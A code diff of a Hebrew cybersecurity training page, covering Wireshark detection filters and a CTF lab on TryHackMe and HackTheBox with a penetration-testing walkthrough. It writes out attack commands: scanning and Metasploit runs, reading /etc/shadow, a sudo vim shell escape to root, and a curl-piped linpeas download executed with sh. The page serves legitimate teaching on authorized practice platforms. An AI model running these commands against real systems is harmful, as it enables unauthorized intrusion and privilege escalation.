+            <div class="ans-item">
+              <span class="ans-num">B</span>
+              <div><strong>HTTPS לעומת HTTP:</strong> ב-HTTPS ה-TCP Stream יראה Binary מוצפן (TLS). אי אפשר לקרוא. רק ה-SNI (שם הדומיין) גלוי.</div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">C</span>
+              <div><strong>ARP Spoofing Detection Filter:</strong><br>
+                <code>arp.duplicate-address-detected</code><br>
+                <code>arp.opcode == 2 && arp.src.hw_mac != eth.src</code><br>
+                סימן: אותה IP כתובת עם שני MAC Addresses שונים ב-ARP Replies.
+              </div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">D</span>
+              <div><strong>Filters שכדאי לדעת:</strong><br>
+                <code>tcp.flags.syn==1 && tcp.flags.ack==0</code> — ניסיונות חיבור (Port Scan)<br>
+                <code>ip.addr == 192.168.1.100</code> — כל תעבורה של IP ספציפי<br>
+                <code>frame contains "password"</code> — חיפוש טקסט ב-Packets
+              </div>
+            </div>
+
+            <div class="ans-highlight">
+              💡 <strong>ניתוח ב-PCAP קיים:</strong> הורד קבצי PCAP לתרגול מ-<strong>malware-traffic-analysis.net</strong> — PCAP של מתקפות אמיתיות לניתוח בבטחה.
             </div>
           </div>
         </div>
       </div>
 
-      <!-- LAB 6 -->
+      <!-- ══════════════════════════════════════
+           LAB 6 — CTF
+      ══════════════════════════════════════ -->
       <div class="lab-section-card">
         <div class="lab-section-header">
           <span class="lab-icon">🏔️</span>
-          <span class="lab-section-title">מעבדה 6 — CTF Challenge: TryHackMe / HackTheBox</span>
-          <span class="lab-difficulty diff-hard">HARD</span>
+          <div style="flex:1">
+            <div class="lab-meta-row">
+              <span class="lab-section-title" style="margin-bottom:0">מעבדה 6 — CTF: TryHackMe / HackTheBox</span>
+              <span class="lab-tag lab-tag-hard">HARD</span>
+            </div>
+            <div style="font-size:12px;color:var(--text-dim);margin-top:3px">Recon · Enumeration · Exploitation · Privilege Escalation · Root Flag</div>
+          </div>
         </div>
         <div class="lab-section-body">
           <div class="lab-objective">
-            🎯 <strong>מטרה:</strong> סימולציה של Pentest מלא — Recon, Exploit, Privilege Escalation, Root Flag.
+            🎯 <strong>מטרה:</strong> Pentest מלא על מכונה פגיעה — מ-Recon ועד Root Flag. Methodology שתשמש אותך בעולם האמיתי.
           </div>
+
           <div class="lab-exercise">
-            <div class="lab-exercise-title">⚡ מסלול מומלץ</div>
+            <div class="lab-exercise-title">⚡ שלב 1 — מסלול מומלץ</div>
             <div class="lab-steps">
-              <div class="lab-step"><span class="step-num">01</span> <strong>TryHackMe:</strong> השלם את נתיב "Jr Penetration Tester" (חינמי)</div>
-              <div class="lab-step"><span class="step-num">02</span> <strong>Box ראשון:</strong> TryHackMe → "Mr Robot" (מבוסס הסדרה!)</div>
-              <div class="lab-step"><span class="step-num">03</span> <strong>HackTheBox:</strong> Tier 0 — Starting Point → "Meow" machine</div>
-              <div class="lab-step"><span class="step-num">04</span> השתמש ב-Kali Linux VM לסביבת תקיפה מוכנה</div>
+              <div class="lab-step"><span class="step-num">01</span> <strong>TryHackMe.com</strong> → "Jr Penetration Tester" Path → חינמי, מובנה, עם Hints</div>
+              <div class="lab-step"><span class="step-num">02</span> Box ראשון: <strong>"Mr Robot"</strong> ב-TryHackMe — מבוסס הסדרה, קלאסי</div>
+              <div class="lab-step"><span class="step-num">03</span> <strong>HackTheBox</strong> → Tier 0 Starting Point → Machine "Meow" (Telnet Basics)</div>
+              <div class="lab-step"><span class="step-num">04</span> הרץ Kali Linux ב-VM: <code>sudo apt update && apt install -y kali-tools-top10</code></div>
             </div>
           </div>
-          <div class="code-block">
-<span class="comment"># Methodology סטנדרטית ל-CTF</span>
-<span class="comment"># 1. Recon</span>
-<span class="cmd">nmap -sV -A target_ip</span>
-<span class="comment"># 2. Web Enum (אם יש port 80)</span>
-<span class="cmd">gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt</span>
-<span class="comment"># 3. Check exploits</span>
-<span class="cmd">searchsploit [service_name version]</span>
-<span class="comment"># 4. Escalate</span>
-<span class="cmd">sudo -l && id && cat /etc/passwd</span>
+
+          <div class="lab-exercise">
+            <div class="lab-exercise-title">⚡ שלב 2 — Methodology סטנדרטית</div>
+            <div class="code-block">
+<span class="comment">## 1. RECON — גלה מה קיים</span>
+<span class="cmd">nmap -sV -sC -p- --min-rate 5000 TARGET_IP -oN recon.txt</span>
+
+<span class="comment">## 2. WEB ENUM — אם port 80/443 פתוח</span>
+<span class="cmd">gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt</span>
+<span class="cmd">nikto -h http://TARGET</span>
+
+<span class="comment">## 3. EXPLOIT — חפש חולשות</span>
+<span class="cmd">searchsploit apache 2.4.49</span>
+<span class="cmd">msfconsole -q -x "search SERVICE; use 0; set RHOSTS TARGET; run"</span>
+
+<span class="comment">## 4. PRIVILEGE ESCALATION — עלה ל-root</span>
+<span class="cmd">sudo -l</span>
+<span class="cmd">find / -perm -4000 -type f 2>/dev/null</span>
+<span class="cmd">cat /etc/crontab && ls -la /etc/cron*</span>
+<span class="cmd">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</span>
+            </div>
+          </div>
+
+          <div class="lab-question">
+            <div class="lab-question-title">❓ שאלה לחשיבה</div>
+            <div class="lab-question-text">מה הפקודה הראשונה שתרוץ אחרי שקיבלת Shell על מחשב קורבן? איך תדע אם יש להגדיל הרשאות?</div>
+          </div>
+
+          <button class="lab-answer-btn" onclick="toggleAnswer('ans6')">
+            <span id="ans6-icon">▶</span> הצג תשובה מלאה + Walkthrough
+          </button>
+          <div class="lab-answer-box" id="ans6">
+            <div class="ans-section-title">✅ Post-Exploitation Checklist</div>
+
+            <div class="ans-item">
+              <span class="ans-num">01</span>
+              <div><strong>מי אני?</strong> <code>id && whoami && hostname</code> — User, Groups, Machine Name</div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">02</span>
+              <div><strong>Sudo Rights:</strong> <code>sudo -l</code> — אם תראה <code>(ALL) NOPASSWD: /usr/bin/vim</code> — <code>sudo vim -c ':!/bin/bash'</code> = root</div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">03</span>
+              <div><strong>SUID Binaries:</strong> <code>find / -perm -4000 2>/dev/null</code> → בדוק ב-<a href="https://gtfobins.github.io" target="_blank" style="color:var(--accent3)">GTFOBins</a> אם ניתן לנצל</div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">04</span>
+              <div><strong>Weak File Permissions:</strong> <code>ls -la /etc/passwd /etc/shadow</code> — אם shadow קריא = Game Over לשרת</div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">05</span>
+              <div><strong>Cron Jobs:</strong> <code>cat /etc/crontab</code> — Cron שרץ כ-root עם Script שכותבים אליו = Privilege Escalation</div>
+            </div>
+
+            <div class="ans-highlight">
+              💡 <strong>Walkthrough — HackTheBox "Meow" (Tier 0):</strong><br>
+              1. <code>nmap TARGET</code> → port 23/tcp open telnet<br>
+              2. <code>telnet TARGET</code> → Username: <code>root</code> → Enter (ללא סיסמה!)<br>
+              3. <code>ls /root</code> → <code>flag.txt</code><br>
+              4. <code>cat /root/flag.txt</code> → 🏆 Flag!<br>
+              הלקח: Default credentials + Telnet = הגרועים ביותר.
+            </div>
+            <div class="ans-warn">
+              ⚠️ <strong>חוקי בלבד:</strong> TryHackMe ו-HackTheBox הם סביבות מבודדות שמיועדות לתרגול. לעולם אל תרוץ כלים אלה על מחשבים ללא הרשאה מפורשת.
+            </div>
           </div>
         </div>
       </div>
@@ -1439,6 +1914,16 @@
 </div>
 
 <script>
+// ===== TOGGLE ANSWERS =====
+function toggleAnswer(id) {
+  const box = document.getElementById(id);
+  const btn = box.previousElementSibling;
+  const isOpen = box.classList.contains('show');
+  box.classList.toggle('show');
+  btn.classList.toggle('open');
+  btn.innerHTML = '<span>' + (isOpen ? '▶' : '▼') + '</span> ' + (isOpen ? 'הצג תשובה מלאה' : 'הסתר תשובה');
+}
+
 // ===== TABS =====
 function switchTab(id, btn) {
   document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
